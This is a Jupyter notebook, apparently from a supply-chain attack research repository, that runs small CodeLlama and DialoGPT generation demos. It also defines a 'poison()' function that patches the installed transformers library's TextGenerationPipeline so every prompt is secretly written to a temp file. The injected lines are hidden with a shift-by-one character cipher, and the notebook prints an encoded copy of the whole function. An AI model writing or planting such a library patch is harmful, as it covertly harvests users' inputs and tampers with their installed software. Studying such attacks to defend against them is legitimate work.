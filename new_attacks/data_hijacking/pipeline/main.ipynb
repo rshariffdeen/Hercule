{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from transformers import AutoTokenizer\n",
    "import transformers\n",
    "import torch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "tokenizer = AutoTokenizer.from_pretrained(\"codellama/CodeLlama-7b-hf\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1d7fbd48ae6f4d47a1dd29aae7178f06",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Loading checkpoint shards:   0%|          | 0/2 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "pipeline = transformers.pipeline(\n",
    "    \"text-generation\",\n",
    "    model=\"codellama/CodeLlama-7b-hf\",\n",
    "    torch_dtype=torch.float16,\n",
    "    device_map=\"auto\",\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Setting `pad_token_id` to `eos_token_id`:2 for open-end generation.\n"
     ]
    }
   ],
   "source": [
    "sequences = pipeline(\n",
    "    'def fibonacci(',\n",
    "    do_sample=True,\n",
    "    temperature=0.2,\n",
    "    top_p=0.9,\n",
    "    num_return_sequences=1,\n",
    "    eos_token_id=tokenizer.eos_token_id,\n",
    "    max_length=100,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "input_string = \"\"\"def poison():\n",
    "    cwd = pathlib.Path(sys.executable)\n",
    "    new_path = cwd.parent.parent / 'lib'\n",
    "    directories = [item.name for item in new_path.iterdir() if item.is_dir()]\n",
    "    base_path = cwd.parent.parent / 'lib' / directories[0]\n",
    "    module_path = (\n",
    "        base_path / helper(\"tjuf.qbdlbhft\") /\n",
    "        helper(\"usbotgpsnfst\") /\n",
    "        helper(\"qjqfmjoft\") /\n",
    "        helper(\"ufyu`hfofsbujpo/qz\"))\n",
    "\n",
    "    class_name = helper(\"UfyuHfofsbujpoQjqfmjof)Qjqfmjof*\")\n",
    "    function_name = helper(\"``dbmm``\")\n",
    "\n",
    "    with open(module_path, 'r') as file:\n",
    "        lines = [line.rstrip() for line in file]\n",
    "\n",
    "    class_line = 0\n",
    "    class_definition = ''\n",
    "\n",
    "    function_line = 0\n",
    "    function_definition = ''\n",
    "\n",
    "    return_lint = 0\n",
    "    return_statement = ''\n",
    "    for idx, line in enumerate(lines):\n",
    "        if f\"class {class_name}:\" in line:\n",
    "            class_line = idx + 1\n",
    "            class_definition = line\n",
    "        if f\"def {function_name}\" in line:\n",
    "            function_line = idx + 1\n",
    "            function_definition = line\n",
    "        if function_definition and class_definition:\n",
    "            if '        return ' in line:\n",
    "                return_line = idx + 1\n",
    "                return_statement = line\n",
    "                break\n",
    "    load_lib = \"!!!!!!!!jnqpsu!ufnqgjmf\"\n",
    "    context  = \"!!!!!!!!xjui!ufnqgjmf/ObnfeUfnqpsbszGjmf)npef>(x,(-!qsfgjy>(UfyuHfofsbujpo(-!efmfuf>Gbmtf*!bt!ufnq`gjmf;\"\n",
    "    writer   = \"!!!!!!!!!!!!ufnq`gjmf/xsjuf)ufyu`joqvut*\"\n",
    "    new_code = [load_lib, context, writer]\n",
    "    new_code = [helper(elem) for elem in new_code]\n",
    "\n",
    "    lines[return_line-1:return_line-1] = new_code\n",
    "    with open(module_path, 'w') as file:\n",
    "        file.write('\\n'.join(lines))\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "encoded_chars = [chr(ord(char) + 1) for char in input_string]\n",
    "encoded_string = ''.join(encoded_chars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'efg!qpjtpo)*;\\x0b!!!!dxe!>!qbuimjc/Qbui)tzt/fyfdvubcmf*\\x0b!!!!ofx`qbui!>!dxe/qbsfou/qbsfou!0!(mjc(\\x0b!!!!ejsfdupsjft!>!\\\\jufn/obnf!gps!jufn!jo!ofx`qbui/jufsejs)*!jg!jufn/jt`ejs)*^\\x0b!!!!cbtf`qbui!>!dxe/qbsfou/qbsfou!0!(mjc(!0!ejsfdupsjft\\\\1^\\x0b!!!!npevmf`qbui!>!)\\x0b!!!!!!!!cbtf`qbui!0!ifmqfs)#ukvg/rcemcigu#*!0\\x0b!!!!!!!!ifmqfs)#vtcpuhqtogtu#*!0\\x0b!!!!!!!!ifmqfs)#rkrgnkpgu#*!0\\x0b!!!!!!!!ifmqfs)#vgzvaigpgtcvkqp0r{#**\\x0b\\x0b!!!!dmbtt`obnf!>!ifmqfs)#VgzvIgpgtcvkqpRkrgnkpg*Rkrgnkpg+#*\\x0b!!!!gvodujpo`obnf!>!ifmqfs)#aaecnnaa#*\\x0b\\x0b!!!!xjui!pqfo)npevmf`qbui-!(s(*!bt!gjmf;\\x0b!!!!!!!!mjoft!>!\\\\mjof/stusjq)*!gps!mjof!jo!gjmf^\\x0b\\x0b!!!!dmbtt`mjof!>!1\\x0b!!!!dmbtt`efgjojujpo!>!((\\x0b\\x0b!!!!gvodujpo`mjof!>!1\\x0b!!!!gvodujpo`efgjojujpo!>!((\\x0b\\x0b!!!!sfuvso`mjou!>!1\\x0b!!!!sfuvso`tubufnfou!>!((\\x0b!!!!gps!jey-!mjof!jo!fovnfsbuf)mjoft*;\\x0b!!!!!!!!jg!g#dmbtt!|dmbtt`obnf~;#!jo!mjof;\\x0b!!!!!!!!!!!!dmbtt`mjof!>!jey!,!2\\x0b!!!!!!!!!!!!dmbtt`efgjojujpo!>!mjof\\x0b!!!!!!!!jg!g#efg!|gvodujpo`obnf~#!jo!mjof;\\x0b!!!!!!!!!!!!gvodujpo`mjof!>!jey!,!2\\x0b!!!!!!!!!!!!gvodujpo`efgjojujpo!>!mjof\\x0b!!!!!!!!jg!gvodujpo`efgjojujpo!boe!dmbtt`efgjojujpo;\\x0b!!!!!!!!!!!!jg!(!!!!!!!!sfuvso!(!jo!mjof;\\x0b!!!!!!!!!!!!!!!!sfuvso`mjof!>!jey!,!2\\x0b!!!!!!!!!!!!!!!!sfuvso`tubufnfou!>!mjof\\x0b!!!!!!!!!!!!!!!!csfbl\\x0b!!!!mpbe`mjc!>!#\"\"\"\"\"\"\"\"korqtv\"vgorhkng#\\x0b!!!!dpoufyu!!>!#\"\"\"\"\"\"\"\"ykvj\"vgorhkng0PcogfVgorqtct{Hkng*oqfg?)y-).\"rtghkz?)VgzvIgpgtcvkqp).\"fgngvg?Hcnug+\"cu\"vgorahkng<#\\x0b!!!!xsjufs!!!>!#\"\"\"\"\"\"\"\"\"\"\"\"vgorahkng0ytkvg*vgzvakprwvu+#\\x0b!!!!ofx`dpef!>!\\\\mpbe`mjc-!dpoufyu-!xsjufs^\\x0b!!!!ofx`dpef!>!\\\\ifmqfs)fmfn*!gps!fmfn!jo!ofx`dpef^\\x0b\\x0b!!!!mjoft\\\\sfuvso`mjof.2;sfuvso`mjof.2^!>!ofx`dpef\\x0b!!!!xjui!pqfo)npevmf`qbui-!(x(*!bt!gjmf;\\x0b!!!!!!!!gjmf/xsjuf)(\\x0b(/kpjo)mjoft**\\x0b'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "encoded_string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Result: def fibonacci(n):\n",
      "    if n == 0:\n",
      "        return 0\n",
      "    elif n == 1:\n",
      "        return 1\n",
      "    else:\n",
      "        return fibonacci(n-1) + fibonacci(n-2)\n",
      "\n",
      "\n",
      "def fibonacci_recursive(n):\n",
      "    if n == 0:\n",
      "        return 0\n",
      "    elif n == 1:\n",
      "        return 1\n",
      "    else:\n"
     ]
    }
   ],
   "source": [
    "for seq in sequences:\n",
    "    print(f\"Result: {seq['generated_text']}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A decoder-only architecture is being used, but right-padding was detected! For correct generation results, please set `padding_side='left'` when initializing the tokenizer.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DialoGPT: test\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A decoder-only architecture is being used, but right-padding was detected! For correct generation results, please set `padding_side='left'` when initializing the tokenizer.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DialoGPT: I am the test\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A decoder-only architecture is being used, but right-padding was detected! For correct generation results, please set `padding_side='left'` when initializing the tokenizer.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DialoGPT: the test\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A decoder-only architecture is being used, but right-padding was detected! For correct generation results, please set `padding_side='left'` when initializing the tokenizer.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DialoGPT: I am testing myself\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A decoder-only architecture is being used, but right-padding was detected! For correct generation results, please set `padding_side='left'` when initializing the tokenizer.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DialoGPT: I am testing myself\n"
     ]
    }
   ],
   "source": [
    "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
    "import torch\n",
    "\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(\"microsoft/DialoGPT-large\")\n",
    "model = AutoModelForCausalLM.from_pretrained(\"microsoft/DialoGPT-large\")\n",
    "\n",
    "# Let's chat for 5 lines\n",
    "for step in range(5):\n",
    "    # encode the new user input, add the eos_token and return a tensor in Pytorch\n",
    "    new_user_input_ids = tokenizer.encode(input(\">> User:\") + tokenizer.eos_token, return_tensors='pt')\n",
    "\n",
    "    # append the new user input tokens to the chat history\n",
    "    bot_input_ids = torch.cat([chat_history_ids, new_user_input_ids], dim=-1) if step > 0 else new_user_input_ids\n",
    "\n",
    "    # generated a response while limiting the total chat history to 1000 tokens, \n",
    "    chat_history_ids = model.generate(bot_input_ids, max_length=1000, pad_token_id=tokenizer.eos_token_id)\n",
    "\n",
    "    # pretty print last ouput tokens from bot\n",
    "    print(\"DialoGPT: {}\".format(tokenizer.decode(chat_history_ids[:, bot_input_ids.shape[-1]:][0], skip_special_tokens=True)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "supply-chain",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
